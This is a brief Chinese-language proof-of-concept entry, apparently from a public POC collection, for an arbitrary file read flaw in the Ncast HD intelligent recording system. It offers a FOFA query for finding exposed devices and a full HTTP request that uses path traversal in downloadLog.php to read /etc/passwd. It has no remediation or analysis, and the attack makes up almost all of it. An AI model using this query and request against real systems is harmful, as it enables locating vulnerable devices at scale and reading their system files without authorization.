## Ncast高清智能录播系统存在任意文件读取漏洞

## fofa
```
app="Ncast-产品" && title=="高清智能录播系统"
```

## poc
```
GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
Host: xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=xxxx
Connection: close
```

![f16b573778c2032b1efded155edef6e1](https://github.com/wy876/POC/assets/139549762/4e73f0f0-e917-41f2-8b8a-faf0cc44a19d)
